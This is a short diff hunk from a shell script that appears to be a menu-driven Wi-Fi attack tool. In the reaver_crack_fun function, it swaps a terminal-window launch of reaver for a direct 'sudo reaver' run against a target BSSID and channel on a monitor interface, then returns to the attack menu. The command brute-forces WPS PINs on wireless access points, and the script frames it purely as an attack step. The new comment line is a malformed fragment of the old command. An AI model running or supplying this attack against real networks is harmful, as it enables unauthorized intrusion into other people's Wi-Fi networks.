@@ -304,9 +304,9 @@ attack_main_fun
 
 #################### Reaver
 reaver_crack_fun(){
-## xfce4-terminal --window --hide-menubar -T 'reaver' -e "sudo reaver -i $MON -b $BSSID -vv"
-xfce4-terminal --window --hide-menubar -T 'reaver' -e "sudo reaver -i $MON -b $BSSID -c $CH -a -N -vv"
-
+# reaver' -e "sudo reaver -i $MON -b $BSSID -vv
+sudo reaver -i $MON -b $BSSID -c $CH -a -N -vv
+read
 attack_main_fun
 }
 
